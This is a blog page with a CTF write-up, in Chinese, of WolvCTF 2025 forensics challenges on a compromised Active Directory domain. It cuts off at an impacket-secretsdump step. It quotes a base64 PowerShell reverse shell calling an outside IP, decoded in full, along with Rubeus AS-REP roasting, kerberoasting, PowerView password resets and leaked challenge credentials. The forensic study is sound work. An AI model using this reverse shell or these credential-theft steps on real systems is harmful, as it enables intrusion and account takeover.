<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTeam: QnQSecRank: 9這周末看到隊上在打就跳下去玩惹，然後就變成 Forensics 手了整體 infra 不錯，可惜 Web&#x2F;Crypto 部分沒什麼能大發揮的 QwQ   ForensicsActive 1: Domain Access這一系列題目是給一包被打下的 Domain 的 User 資料夾做 Forensics第一部分要求我找到進入內網的">
<meta property="og:type" content="article">
<meta property="og:title" content="WolvCTF 2025 Write Up">
<meta property="og:url" content="http://wha13.github.io/2025/03/24/wolvctf-2025/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTeam: QnQSecRank: 9這周末看到隊上在打就跳下去玩惹，然後就變成 Forensics 手了整體 infra 不錯，可惜 Web&#x2F;Crypto 部分沒什麼能大發揮的 QwQ   ForensicsActive 1: Domain Access這一系列題目是給一包被打下的 Domain 的 User 資料夾做 Forensics第一部分要求我找到進入內網的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/HyXfmvpn1l.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryJuhrA31l.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyDCNU02Je.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk1gmL0nkg.png">
<meta property="article:published_time" content="2025-03-24T15:51:20.000Z">
<meta property="article:modified_time" content="2025-03-24T06:29:29.233Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Prepend Oracle">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="Active Directory">
<meta property="article:tag" content="Forensics">
<meta property="article:tag" content="QnQSec">
<meta property="article:tag" content="php">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/HyXfmvpn1l.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>WolvCTF 2025 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/04/htb-haze/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/20/burp-bluestacks/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/03/24/wolvctf-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&text=WolvCTF 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&is_video=false&description=WolvCTF 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WolvCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/03/24/wolvctf-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&name=WolvCTF 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/03/24/wolvctf-2025/&t=WolvCTF 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">2.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-1-Domain-Access"><span class="toc-number">2.1.</span> <span class="toc-text">Active 1: Domain Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-2-Lateral-Movement"><span class="toc-number">2.2.</span> <span class="toc-text">Active 2: Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-3-Domain-Admin"><span class="toc-number">2.3.</span> <span class="toc-text">Active 3: Domain Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-1"><span class="toc-number">3.1.</span> <span class="toc-text">Limited 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-2"><span class="toc-number">3.2.</span> <span class="toc-text">Limited 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-3"><span class="toc-number">3.3.</span> <span class="toc-text">Limited 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Art-Contest"><span class="toc-number">3.4.</span> <span class="toc-text">Art Contest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB"><span class="toc-number">4.1.</span> <span class="toc-text">ECB++</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Office"><span class="toc-number">5.1.</span> <span class="toc-text">Office</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        WolvCTF 2025 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-24T15:51:20.000Z" class="dt-published" itemprop="datePublished">2025-03-24</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="p-category" href="/tags/Prepend-Oracle/" rel="tag">Prepend Oracle</a>, <a class="p-category" href="/tags/QnQSec/" rel="tag">QnQSec</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Team: QnQSec<br>Rank: 9<br>這周末看到隊上在打就跳下去玩惹，<del>然後就變成 Forensics 手了</del><br>整體 infra 不錯，可惜 Web&#x2F;Crypto 部分沒什麼能大發揮的 QwQ  </p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Active-1-Domain-Access"><a href="#Active-1-Domain-Access" class="headerlink" title="Active 1: Domain Access"></a>Active 1: Domain Access</h3><p>這一系列題目是給一包被打下的 Domain 的 User 資料夾做 Forensics<br>第一部分要求我找到進入內網的整個過程， Flag 被拆成三段（？蛤<br>找到了一個<code>/Public/Documents/winPEASOutput.txt</code> ：  </p>
<p>首先是 dan 的 password leak，default name hex 解碼是 flag 第三段：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">T%P%P%P%P%P%P%P%P%P%P%c% Looking for AutoLogon credentials</span><br><span class="line">    Some AutoLogon credentials were found</span><br><span class="line">    DefaultDomainName             :  WOLVCTF</span><br><span class="line">    DefaultUserName               :  WOLVCTF\Dan</span><br><span class="line">    DefaultPassword               :  DansSuperCoolPassw0rd!!</span><br><span class="line">    AltDefaultUserName            :  loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d</span><br></pre></td></tr></table></figure>
<p> &#x3D;&gt; <code>enabl3_4ut0log0n_0k??!?&#125;</code></p>
<p>再來是 process 中隱藏的 base64 decode 有 flag：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=================================================================================================                                                       </span><br><span class="line"></span><br><span class="line">    powershell(8532)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: MSSQL$SQLEXPRESS</span><br><span class="line">    Command Line: powershell  -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==                                                                                               </span><br><span class="line">   ================================================================================================= </span><br></pre></td></tr></table></figure>
<p>&#x3D;&gt;  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.187.128&quot;,1433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$encoded_flagpt2 = &quot;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s&quot;;$flagpt2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_flagpt2));Write-Output $flagpt2;$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>
<p>&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_xP_cmdsh311_w1th_d3fault_cr3ds_0r_</span><br></pre></td></tr></table></figure>
<p>最後，尋找進入點：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">T%P%P%P%P%P%P%P%P%P%P%c% User Environment Variables</span><br><span class="line">Z% Check for some passwords or keys in the env variables </span><br><span class="line">    COMPUTERNAME: DC01</span><br><span class="line">    PUBLIC: C:\Users\Public</span><br><span class="line">    LOCALAPPDATA: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local</span><br><span class="line">    PSModulePath: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\130\Tools\PowerShell\Modules\</span><br><span class="line">    PROCESSOR_ARCHITECTURE: AMD64</span><br><span class="line">    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\mssql_service\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\130\Tools\Binn\;C:\Users\mssql_service\130\Tools\Binn\;C:\Users\mssql_service\130\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Microsoft\WindowsApps</span><br><span class="line">    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files</span><br><span class="line">    ProgramFiles(x86): C:\Program Files (x86)</span><br><span class="line">    PROCESSOR_LEVEL: 6</span><br><span class="line">    ProgramFiles: C:\Program Files</span><br><span class="line">    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL</span><br><span class="line">    USERPROFILE: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS</span><br><span class="line">    SystemRoot: C:\Windows</span><br><span class="line">    ALLUSERSPROFILE: C:\ProgramData</span><br></pre></td></tr></table></figure>

<p>當前 User 是 mssql，其實看一下 log 會發現被 SQLi 開 xp_cmdshell，去他的資料夾翻一下會在 Log 看到檔案一堆檔案，用<code>log_7.trc</code> 觀察<br>密碼潑灑的過程組成的字串就是 Flag<br><img src="https://hackmd.io/_uploads/HyXfmvpn1l.png" alt="image"></p>
<p>組起來就行 w</p>
<h3 id="Active-2-Lateral-Movement"><a href="#Active-2-Lateral-Movement" class="headerlink" title="Active 2: Lateral Movement"></a>Active 2: Lateral Movement</h3><p>接下來是尋找後滲透足跡：<br>先讀 Powershell History：<br><code>/dan/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt</code>  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-OutputDirectory</span> C:\Users\dan\Documents <span class="literal">-OutputPrefix</span> <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">powershell <span class="literal">-ep</span> bypass</span><br><span class="line">.\SharpHound.ps1</span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-OutputDirectory</span> C:\Users\dan\Documents <span class="literal">-OutputPrefix</span> <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line"><span class="built_in">Import-Module</span> \SharpHound.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\SharpHound.ps1</span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-OutputDirectory</span> C:\Users\dan\Documents <span class="literal">-OutputPrefix</span> <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">.\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp &gt; asreproast.output</span><br><span class="line"> .\Rubeus.exe kerberoast &gt; kerberoast.output</span><br><span class="line">runas /User:wolvctf\emily cmd`</span><br></pre></td></tr></table></figure>
<p>是在對 emily 做 AS-REP Roasting，在 <code>asreproast.output</code> 拿到 golden ticket  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">��</span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : emily</span><br><span class="line">[*] Target Domain          : wolvctf.corp</span><br><span class="line">[*] Target DC              : DC01.wolvctf.corp</span><br><span class="line"></span><br><span class="line">[*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) for: &#x27;wolvctf.corp\emily&#x27;</span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP hash:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C7</span><br><span class="line">      8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364</span><br><span class="line">      39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC</span><br><span class="line">      AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C</span><br><span class="line">      C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8</span><br><span class="line">      DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6</span><br><span class="line">      5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023</span><br><span class="line"></span><br><span class="line">[*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw== </span><br></pre></td></tr></table></figure>
<p>扔進 john 爆破拿到密碼 <code>youdontknowmypasswordhaha</code><br><del>然後底下的 base64 是第一段 flag，我那時候找好久最後還是隊友提醒我的</del><br>再來是 emily 的 PSHistory：  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\emily</span><br><span class="line">tree /f /a &gt; tree.txt</span><br><span class="line"><span class="built_in">type</span> tree.txt</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">type</span> README</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;James asked me to keep his password secret, so I made sure to take extra precautions.&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Note to self: Password for the zip is same as mine, with 777 at the end&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line"><span class="built_in">del</span> README</span><br><span class="line"><span class="built_in">cp</span> .\important.<span class="number">7</span>z C:\Users\Public</span><br><span class="line"><span class="built_in">del</span> C:\Users\Public\loot.txt</span><br><span class="line"><span class="built_in">del</span> C:\Users\Public\important.<span class="number">7</span>z</span><br><span class="line">runas /User:wolvctf\james cmd</span><br></pre></td></tr></table></figure>
<p>拿到 important.7z，解壓縮後拿到三張圖片其中一張 foremost 出來就是 Flag，另外他也登入了 James 帳號。<br><img src="https://hackmd.io/_uploads/ryJuhrA31l.png" alt="image"><br>James 的 History 裡直接就是 Flag  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Public\Documents</span><br><span class="line"><span class="built_in">mv</span> .\PowerView.txt .\PowerView.ps1</span><br><span class="line">powershell <span class="literal">-ep</span> bypass</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Find-DomainProcess</span></span><br><span class="line"><span class="variable">$NewPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Password123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>`</span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> <span class="string">&#x27;emily&#x27;</span> <span class="literal">-AccountPassword</span> <span class="variable">$NewPassword</span></span><br><span class="line"><span class="variable">$NewPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;d0nt_us3_4ll3xtendedr1ghts&#125;&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>`</span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> <span class="string">&#x27;patrick&#x27;</span> <span class="literal">-AccountPassword</span> <span class="variable">$NewPassword</span></span><br><span class="line">runas /User:wolvctf\patrick cmd</span><br></pre></td></tr></table></figure>
<h3 id="Active-3-Domain-Admin"><a href="#Active-3-Domain-Admin" class="headerlink" title="Active 3: Domain Admin"></a>Active 3: Domain Admin</h3><p>要拿到 Admin 密碼，在<code>/jake/Downloads</code>裡拿到 <code>ntds.dit</code> 和 <code>system.hive</code>，先用 <code>impacket-secretsdump</code> 炸密碼：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL</span><br></pre></td></tr></table></figure>
